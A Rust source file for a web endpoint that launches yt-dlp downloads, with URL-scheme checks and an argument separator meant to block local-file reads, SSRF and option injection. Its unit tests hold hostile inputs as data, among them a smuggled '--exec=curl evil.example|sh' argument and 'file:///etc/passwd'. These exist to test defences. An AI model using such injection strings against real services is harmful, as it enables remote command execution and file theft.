use std::fs;
use std::path::{Path, PathBuf};
use std::time::SystemTime;

use axum::{extract::State, Json};
use serde::Deserialize;
use tokio::process::Command;

use crate::proc::run_with_progress;
use crate::state::{AppState, Job, JobKind};
use crate::upload::{bad, ApiError, JobDir};

#[derive(Deserialize)]
pub struct DownloadRequest {
    pub url: String,
    /// Container/audio format, e.g. "mp4", "mp3", "ogg".
    pub format: String,
    /// Max video height as a string ("2160", "1080", ...) or "best".
    /// Ignored for audio-only formats.
    #[serde(default)]
    pub quality: String,
}

const AUDIO_FORMATS: &[&str] = &["mp3", "m4a", "aac", "opus", "ogg", "wav", "flac"];
const VIDEO_FORMATS: &[&str] = &["mp4", "mkv", "webm"];
const QUALITIES: &[&str] = &["best", "2160", "1440", "1080", "720", "480", "360"];

fn is_audio_format(f: &str) -> bool {
    AUDIO_FORMATS.contains(&f)
}

/// Accept only `http(s)` sources.
///
/// yt-dlp happily resolves `file://`, and its generic extractor will follow
/// plenty of other schemes, so an unrestricted input turns this endpoint into a
/// local-file reader and an SSRF gadget against whatever the container can
/// reach. Everything this tool is for is served over HTTP.
fn is_supported_url(url: &str) -> bool {
    let lower = url.to_ascii_lowercase();
    lower.starts_with("http://") || lower.starts_with("https://")
}

/// Map our format name to yt-dlp's `--audio-format` value.
fn ytdlp_audio_format(f: &str) -> &str {
    match f {
        "ogg" => "vorbis", // yt-dlp emits a .ogg file for the vorbis codec
        other => other,
    }
}

/// POST /api/downloads — start a yt-dlp download job.
pub async fn start_download(
    State(state): State<AppState>,
    Json(req): Json<DownloadRequest>,
) -> Result<Json<Job>, ApiError> {
    let url = req.url.trim().to_string();
    if url.is_empty() {
        return Err(bad("url is required"));
    }
    if !is_supported_url(&url) {
        return Err(bad("url must start with http:// or https://"));
    }
    let format = req.format.trim().to_lowercase();
    if !is_audio_format(&format) && !VIDEO_FORMATS.contains(&format.as_str()) {
        return Err(bad(format!("unsupported format: {format}")));
    }
    let audio = is_audio_format(&format);
    let quality = if req.quality.trim().is_empty() {
        "best".to_string()
    } else {
        req.quality.trim().to_string()
    };
    if !audio && !QUALITIES.contains(&quality.as_str()) {
        return Err(bad(format!("unsupported quality: {quality}")));
    }

    let detail = if audio {
        format!("audio · {format}")
    } else if quality == "best" {
        format!("best · {format}")
    } else {
        format!("{quality}p · {format}")
    };

    let (id, dir) = JobDir::create(&state)?.keep();
    let job = Job::new(
        id.clone(),
        JobKind::Download,
        url.clone(),
        detail,
        dir.clone(),
    );
    state.insert_job(job.clone());

    // Run the download in the background and report progress into the job map.
    state.spawn_job(
        &id,
        run_download(state.clone(), id.clone(), url, format, quality, dir),
    );

    Ok(Json(job))
}

async fn run_download(
    state: AppState,
    id: String,
    url: String,
    format: String,
    quality: String,
    dir: PathBuf,
) {
    let _slot = state.acquire_slot(JobKind::Download).await;
    state.set_running(&id);

    let out_template = format!("{}/%(title).200B.%(ext)s", dir.display());
    let mut args: Vec<String> = vec![
        "--no-playlist".into(),
        "--no-color".into(),
        "--newline".into(),
        "--no-warnings".into(),
        // DASH and HLS sources arrive as hundreds of small fragments, fetched one at a time by
        // default; a few in flight hides the per-request latency.
        "--concurrent-fragments".into(),
        "4".into(),
        "--progress-template".into(),
        "PG:%(progress._percent_str)s".into(),
        "-o".into(),
        out_template,
    ];

    if is_audio_format(&format) {
        args.push("-x".into());
        args.push("--audio-format".into());
        args.push(ytdlp_audio_format(&format).into());
        args.push("--audio-quality".into());
        args.push("0".into());
    } else {
        args.push("-f".into());
        args.push("bv*+ba/b".into());
        // A resolution ceiling is a sort, not a filter: a filter rejects every format whose
        // height the site does not report — any direct link to a file — and fails with
        // "Requested format is not available". The sort takes the largest at or under the
        // ceiling, or the smallest above it if there is nothing under. For MP4 and WebM, prefer
        // formats that already suit the container within a resolution, so the result plays
        // where those containers are expected to. Otherwise yt-dlp's own order stands.
        let mut sort: Vec<String> = Vec::new();
        if quality != "best" {
            sort.push(format!("res:{quality}"));
        }
        let fits = match format.as_str() {
            "mp4" => Some("ext:mp4:m4a"),
            "webm" => Some("ext:webm:webm"),
            _ => None,
        };
        if let Some(ext) = fits {
            if sort.is_empty() {
                // Keep resolution ahead of the container, or MP4 would win over a sharper WebM.
                sort.push("res".into());
            }
            sort.push(ext.into());
        }
        if !sort.is_empty() {
            args.push("-S".into());
            args.push(sort.join(","));
        }
        args.push("--merge-output-format".into());
        args.push(format.clone());
        // The merge format only applies when separate video and audio streams are merged; a site
        // that serves one combined file used to come back in whatever container it had, so
        // asking for MKV could produce an MP4. Remuxing is a copy, not an encode. WebM is left
        // alone: it only takes VP8/VP9/AV1, so forcing it would fail outright on an H.264 source
        // where a working file in another container is the more useful outcome.
        if format != "webm" {
            args.push("--remux-video".into());
            args.push(format.clone());
        }
    }
    // `--` first: without it a URL that begins with a dash is parsed as a
    // yt-dlp option, and options like `--exec` run arbitrary commands.
    args.push("--".into());
    args.push(url);

    let mut cmd = Command::new("yt-dlp");
    cmd.args(&args);

    let st = state.clone();
    let jid = id.clone();
    let result = run_with_progress(&mut cmd, move |line| {
        if let Some(pct) = line.strip_prefix("PG:").and_then(parse_percent) {
            // Merging the streams afterwards takes a moment; 100 % waits for that.
            st.set_progress(&jid, pct.min(99.0));
        }
    })
    .await;

    match result {
        Ok(r) if r.success => match newest_file(&dir) {
            Some(path) => {
                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_else(|| "download".to_string());
                state.complete(&id, path, name);
            }
            None => state.fail(&id, "download finished but no output file was produced"),
        },
        Ok(r) => state.fail(&id, r.error_or("yt-dlp exited with an error")),
        Err(e) => state.fail(&id, format!("failed to run yt-dlp: {e}")),
    }
}

/// Parse a yt-dlp percent string like " 42.3%" into a float.
fn parse_percent(s: &str) -> Option<f32> {
    let cleaned = s.trim().trim_end_matches('%').trim();
    cleaned.parse::<f32>().ok().map(|p| p.clamp(0.0, 100.0))
}

/// Return the most recently modified regular file in `dir`.
fn newest_file(dir: &Path) -> Option<PathBuf> {
    let mut best: Option<(SystemTime, PathBuf)> = None;
    for entry in fs::read_dir(dir).ok()?.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let modified = entry.metadata().ok().and_then(|m| m.modified().ok());
        let Some(modified) = modified else { continue };
        if best.as_ref().is_none_or(|(t, _)| modified >= *t) {
            best = Some((modified, path));
        }
    }
    best.map(|(_, p)| p)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_http_and_https() {
        assert!(is_supported_url("https://example.com/watch?v=x"));
        assert!(is_supported_url("http://example.com/x"));
        assert!(is_supported_url("HTTPS://EXAMPLE.COM/x"));
    }

    #[test]
    fn rejects_local_and_exotic_schemes() {
        assert!(!is_supported_url("file:///etc/passwd"));
        assert!(!is_supported_url("ftp://example.com/x"));
        assert!(!is_supported_url("/etc/passwd"));
        assert!(!is_supported_url("example.com/x"));
    }

    #[test]
    fn rejects_option_lookalikes() {
        // These would otherwise reach yt-dlp's argument parser.
        assert!(!is_supported_url("--exec=curl evil.example|sh"));
        assert!(!is_supported_url("-o/tmp/pwned"));
    }

    #[test]
    fn parses_progress_percentages() {
        assert_eq!(parse_percent(" 42.3%"), Some(42.3));
        assert_eq!(parse_percent("100.0%"), Some(100.0));
        assert_eq!(parse_percent("  N/A%"), None);
        // Out-of-range values are clamped rather than trusted.
        assert_eq!(parse_percent("250%"), Some(100.0));
    }
}
